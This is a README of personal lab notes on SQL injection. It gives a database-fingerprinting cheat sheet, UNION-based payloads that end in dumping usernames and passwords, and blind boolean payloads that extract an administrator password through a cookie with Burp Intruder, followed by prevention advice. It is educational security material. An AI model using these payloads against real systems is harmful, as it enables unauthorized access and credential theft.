# SQL Injection (SQLi) — Lab Notes & Reference

Hands-on notes from practising SQL injection in deliberately vulnerable lab environments. This repo documents how I identified and exploited SQLi, and, just as importantly, how each issue should be prevented.

> ⚠️ **Authorized testing only.** Every technique here was performed against intentionally vulnerable practice labs. Never run these against any system you don't own or have explicit written permission to test. Unauthorised access is illegal.

---

## 📚 Contents

- [What is SQL injection?](#what-is-sql-injection)
- [Database fingerprinting cheat sheet](#database-fingerprinting-cheat-sheet)
- [UNION-based attacks](#union-based-attacks)
- [Blind SQLi with conditional responses](#blind-sqli-with-conditional-responses)
- [How to prevent SQL injection](#how-to-prevent-sql-injection)
- [Tools & environment](#tools--environment)

---

## What is SQL injection?

SQL injection happens when user input is placed directly into a database query without being safely separated from the query's code. An attacker can then change what the query does, reading data they shouldn't see, bypassing logins, or extracting entire tables.

These notes cover three stages: fingerprinting the database, extracting data with UNION attacks, and pulling data out one character at a time when the app gives no visible output (blind SQLi).

---

## Database fingerprinting cheat sheet

Different databases use different syntax, so the first step is working out which one is running and how many columns the query returns.

| Database | Column count | Data types | Version |
|---|---|---|---|
| **Oracle** | `' ORDER BY 1--` … increasing until it errors | `' UNION SELECT 'a','a' FROM DUAL--` | `' UNION SELECT banner, NULL FROM v$version--` |
| **Microsoft SQL Server** | `' ORDER BY 1--` | `' UNION SELECT 'a','a'--` | `' UNION SELECT @@version, NULL--` |
| **MySQL** | `' ORDER BY 1#` | `' UNION SELECT 'a','a'#` | `' UNION SELECT @@version, NULL#` |
| **PostgreSQL** | `' ORDER BY 1--` | `' UNION SELECT 'a','a'--` | `' UNION SELECT version(), NULL--` |

**Finding the column count with `ORDER BY`:** increase the number until the query errors. If `ORDER BY 3` works but `ORDER BY 4` fails, the query returns 3 columns.

**Note on comments:** `--` is used by Oracle, SQL Server and PostgreSQL; MySQL uses `#` (or `-- ` with a trailing space).

---

## UNION-based attacks

A `UNION` attack retrieves data from other tables by appending a second `SELECT` to the original query.

### 1. Find the number of columns

```
' UNION SELECT NULL, NULL, NULL--
```

Add or remove `NULL`s until the query succeeds. The number of `NULL`s that works is the column count.

### 2. Find which columns hold text

Replace each `NULL` with a string, one at a time:

```
' UNION SELECT 'abcdef', NULL, NULL--
```

If it errors, that column isn't text, so move the string to the next position. A column that accepts the string can carry your extracted data.

### 3. List the tables (Oracle example)

```
' UNION SELECT table_name, NULL FROM all_tables--
```

Look for a table likely to hold credentials (e.g. `USERS_ABCDEF`).

### 4. List the columns in that table

```
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
```

Identify the username and password columns.

### 5. Extract the credentials

```
' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--
```

This returns the usernames and passwords, which can then be used to log in as the administrator.

---

## Blind SQLi with conditional responses

When the app shows no query output but *behaves* differently for true vs false conditions (e.g. a "Welcome back" message appears or doesn't), you can extract data one boolean at a time.

### Confirm the injection point

Injected into a `TrackingId` cookie:

```
TrackingId=xyz' AND '1'='1     → "Welcome back" appears  (TRUE)
TrackingId=xyz' AND '1'='2     → message absent          (FALSE)
```

The differing responses confirm you can test true/false conditions.

### Confirm a table and user exist

```
' AND (SELECT 'a' FROM users LIMIT 1)='a
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

A TRUE response confirms the `users` table and the `administrator` user exist.

### Find the password length

Increase the number until the condition flips from true to false:

```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

This can be automated in **Burp Intruder** with a numeric payload (range 1–25, step 1), marking the number as the payload position:

```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a
```

The point where the response changes reveals the exact length.

### Extract the password character by character

`SUBSTRING()` pulls out one character at a time to test against each possible value:

```
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```

Using Burp Intruder to cycle the position (`1,1` → `2,1` → …) and the tested character (`a`–`z`, `0`–`9`) recovers the whole password. A **cluster bomb** attack iterates both at once.

> 💡 The payloads above use straight quotes (`'`). If you copy them, make sure they aren't converted to curly quotes (`'`), or they won't work.

---

## How to prevent SQL injection

Documenting the fix is the point of learning the attack:

- **Use parameterised queries (prepared statements).** Keep user input as *data*, never concatenated into the query string. This is the single most effective defence.
- **Use an ORM or query builder** that parameterises by default, and avoid raw string-built queries.
- **Apply least privilege** to the database account the app uses, so a successful injection can reach as little as possible.
- **Validate and allow-list input** where the format is known (e.g. numeric IDs), as defence in depth, not as the primary control.
- **Don't leak errors.** Generic error messages make blind extraction slower and give attackers less to work with.
- **Add a WAF** as an extra layer, understanding it can be bypassed and isn't a substitute for parameterised queries.

---

## Tools & environment

- **Burp Suite** (Proxy, Repeater, Intruder) to intercept and modify requests
- Intentionally vulnerable web-security practice labs
- Databases referenced: Oracle, Microsoft SQL Server, MySQL, PostgreSQL

---

*Part of my cybersecurity learning portfolio. See my [other projects](https://github.com/vipercipher).*
